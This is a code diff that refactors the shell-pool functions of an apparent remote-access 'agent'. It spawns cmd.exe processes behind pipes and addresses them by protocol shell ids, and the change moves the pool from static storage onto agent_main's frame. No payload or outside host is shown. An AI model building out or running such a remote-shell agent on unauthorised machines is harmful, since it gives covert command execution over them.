@@ -6,8 +6,9 @@
 #include "kernel32.h"
 #include "memory.h"
 
-/* static storage = zero-initialized: all slots start free. */
-static shell_slot shells[SHELL_POOL_SIZE];
+/* C1 step 2: no static pool. agent_main() owns the array on its frame
+ * (its lifetime = the process) and passes it to every pool function.
+ * Zero-init happens in agent_main's frame - slots start free. */
 
 /* ---------------------------------------------------------------------------
  * shell_spawn - create cmd.exe behind two pipes and record it in *slot.
@@ -78,11 +79,11 @@ int shell_spawn(shell_slot *slot)
 
 /* Find a free pool slot, spawn cmd.exe into it, return its index
  * (the protocol shell id). -1 = pool full or spawn failed. */
-int shell_open(void)
+int shell_open(shell_slot pool[])
 {
     for (int i = 0; i < SHELL_POOL_SIZE; i++) {
-        if (!shells[i].in_use) {
-            if (shell_spawn(&shells[i]) == 0)
+        if (!pool[i].in_use) {
+            if (shell_spawn(&pool[i]) == 0)
                 return i;
             return -1;          /* spawn failed; the slot stayed free */
         }
@@ -109,11 +110,11 @@ void shell_teardown(shell_slot *slot)
 }
 
 /* Map a protocol shell id to its slot, or NULL when never opened/closed. */
-shell_slot *shell_lookup(unsigned long long id)
+shell_slot *shell_lookup(shell_slot pool[], unsigned long long id)
 {
-    if (id >= SHELL_POOL_SIZE || !shells[id].in_use)
+    if (id >= SHELL_POOL_SIZE || !pool[id].in_use)
         return NULL;
-    return &shells[id];
+    return &pool[id];
 }
 
 /* ---------------------------------------------------------------------------
@@ -168,8 +169,8 @@ int shell_read(shell_slot *slot, unsigned char *out, DWORD cap,
 }
 
 /* Tear down every live shell (agent shutdown - no orphaned cmd.exe). */
-void shell_teardown_all(void)
+void shell_teardown_all(shell_slot pool[])
 {
     for (int i = 0; i < SHELL_POOL_SIZE; i++)
-        shell_teardown(&shells[i]);
+        shell_teardown(&pool[i]);
 }
